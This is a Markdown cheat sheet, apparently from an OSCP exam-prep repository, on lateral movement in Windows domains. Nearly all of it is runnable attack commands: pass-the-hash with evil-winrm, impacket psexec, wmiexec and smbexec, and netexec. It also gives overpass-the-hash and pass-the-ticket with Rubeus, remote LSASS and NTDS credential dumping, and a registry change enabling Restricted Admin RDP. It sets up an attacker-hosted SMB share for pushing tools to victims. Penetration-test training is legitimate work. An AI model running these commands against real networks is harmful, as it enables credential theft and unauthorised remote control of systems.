# 🔀 04 — Lateral Movement

---

## Attack Order

```
1. Validate hash / credentials before moving
2. Pass-the-Hash (PTH) → psexec / wmiexec / smbexec / evil-winrm
3. Overpass-the-Hash (OPtH) → convert NT hash → Kerberos TGT → PTT
4. Pass-the-Ticket (PTT) → .ccache → impersonate user
5. RDP → xfreerdp with hash (Restricted Admin mode)
6. Bulk lateral check → nxc across subnet
```

---

## Environment Setup

```bash
export ip=172.16.1.200        # target host (not necessarily DC)
export dcip=172.16.1.5
export domain=OSCP.EXAM
export user=administrator
export pass='P@ssw0rd'
export nthash=5b38382017f8c0ac215895d5f9aacac4
```

---

## Validate Credentials / Hash First

```bash
# Test creds
nxc smb $ip -u $user -p $pass
nxc winrm $ip -u $user -p $pass

# Test hash
nxc smb $ip -u $user -H $nthash

# Local auth (non-domain)
nxc smb $ip -u $user -H $nthash --local-auth

# (Pwn3d!) in output = local admin confirmed
```

---

## Pass-the-Hash (PTH)

NT hash substitutes for the password — no cracking required.

### evil-winrm

```bash
# With password
sudo evil-winrm -u administrator -p 'P@ssw0rd' -i $ip

# With NT hash
sudo evil-winrm -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -i $ip
```

### impacket-psexec

```bash
# With password
sudo impacket-psexec $domain/administrator:'p@ssw0rd'@$ip

# With hash (LM:NT format — LM portion is blank/dummy)
sudo impacket-psexec administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:3542d79d5d17bc9d3014d4d56b5e3060

sudo impacket-psexec $domain/administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4
```

### impacket-wmiexec

```bash
# With hash — quieter than PSExec (no service write to disk)
sudo impacket-wmiexec administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:3542d79d5d17bc9d3014d4d56b5e3060

sudo impacket-wmiexec $domain/administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4
```

### impacket-smbexec

```bash
# With hash — no binary written to disk (quietest option)
sudo impacket-smbexec administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:3542d79d5d17bc9d3014d4d56b5e3060

sudo impacket-smbexec $domain/administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4
```

### crackmapexec / netexec PTH

```bash
# Local auth (workstation local admin)
sudo crackmapexec smb $ip -u administrator \
  -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth

# Multiple targets at once
sudo crackmapexec smb 172.16.1.100 172.16.1.200 \
  -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 \
  --local-auth --continue-on-success

# Domain hash — run command
sudo crackmapexec smb $ip -d $domain \
  -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -x dir

# PowerShell command
sudo crackmapexec smb $ip -d $domain \
  -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -X Get-ChildItem

# WinRM
sudo crackmapexec winrm $ip -d $domain \
  -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -x dir

# NTDS dump via PTH
sudo crackmapexec smb $ip -d $domain \
  -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 --ntds

# lsassy — dump LSASS credentials remotely
sudo lsassy -u administrator -H :3542d79d5d17bc9d3014d4d56b5e3060 $ip

# Dump LSASS via nxc module
sudo crackmapexec smb $ip -d $domain -u $user -p $pass -M lsassy
```

---

## RDP with Hash

```bash
# Enable Restricted Admin mode first (required for PTH over RDP)
sudo crackmapexec smb $ip -u administrator \
  -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth \
  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# xfreerdp with hash
sudo xfreerdp /u:administrator /pth:3542d79d5d17bc9d3014d4d56b5e3060 \
  /v:$ip +clipboard

# Domain PTH over RDP
sudo xfreerdp /u:administrator /pth:5b38382017f8c0ac215895d5f9aacac4 \
  /d:$domain /v:$ip +clipboard
```

---

## Overpass-the-Hash (OPtH)

Convert NT hash → Kerberos TGT → use ticket for lateral movement.  
More stealthy than PTH — uses Kerberos instead of NTLM.

### Rubeus method (on Windows target)

```bash
# Import ticket into current session (ptt = pass-the-ticket)
C:\Windows\Tasks> .\Rubeus.exe asktgt /domain:OSCP.EXAM \
  /user:administrator /rc4:5b38382017f8c0ac215895d5f9aacac4 /ptt

# Verify ticket was imported
C:\Windows\Tasks> .\Rubeus.exe klist

# Access DC share
C:\Windows\Tasks> dir \\DC01\C$

# Open remote PowerShell session
PS C:\Windows\Tasks> Enter-PSSession -ComputerName DC01

# NOTE: When you see a computer name with '$' as username → SYSTEM user of that host
```

### impacket-getTGT method (from Kali)

```bash
# Request TGT using NT hash
sudo impacket-getTGT -dc-ip $dcip $domain/administrator \
  -hashes :5b38382017f8c0ac215895d5f9aacac4

# NOTE: Leading colon (:) before hash = blank LM portion
# NTLM format is LM:NT — LM is blank in modern systems

# Export ticket and use
export KRB5CCNAME=./administrator.ccache

sudo impacket-psexec $domain/administrator@DC01.$domain \
  -target-ip $dcip -dc-ip $dcip -k -no-pass
```

---

## Pass-the-Ticket (PTT)

Use an existing Kerberos ticket to impersonate a user.

```bash
# Dump tickets on Windows (Rubeus)
C:\Windows\Tasks> .\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Convert .kirbi → .ccache (Kali)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set and use ticket
export KRB5CCNAME=/path/to/ticket.ccache

impacket-psexec -k -no-pass $domain/$user@dc01.$domain
impacket-wmiexec -k -no-pass $domain/$user@dc01.$domain
impacket-secretsdump -k -no-pass $domain/$user@dc01.$domain

# Verify ticket
klist
```

---

## SMB Server for File Transfer

```bash
# Basic SMB server
sudo impacket-smbserver kali .

# With SMB2 support (modern Windows requires this)
sudo impacket-smbserver -smb2support kali .

# With credentials (bypass guest restrictions)
sudo impacket-smbserver -smb2support -user test -pass '' kali .
# Verify from target:
net use \\KALI_IP\share /USER:test

# With specific credentials
sudo impacket-smbserver -smb2support -username thm-unpriv -password Password321 kali .

# Download on Windows victim
copy \\KALI_IP\kali\tool.exe C:\Windows\Tasks\tool.exe
```

---

## Checklist

```
[ ] Hash / credentials validated before attempting lateral movement
[ ] PTH attempted: psexec / wmiexec / smbexec
[ ] evil-winrm tested (port 5985 open?)
[ ] RDP Restricted Admin enabled if needed
[ ] OPtH tested via Rubeus or impacket-getTGT
[ ] Ticket (PTT) imported and verified with klist
[ ] Local admin confirmed on each new host (Pwn3d! in nxc output)
[ ] SAM / LSA dumped from each compromised host
[ ] New hashes saved to creds/credentials.txt
[ ] SMB server up for file transfer
```

---

**MITRE ATT&CK:** T1550.002 (Pass the Hash) · T1550.003 (Pass the Ticket) · T1021.001 (RDP) · T1021.006 (WinRM) · T1021.002 (SMB / Windows Admin Shares)

[← Credential Attacks](../03-credential-attacks/README.md) | [Next: Privilege Escalation →](../05-privilege-escalation/README.md)
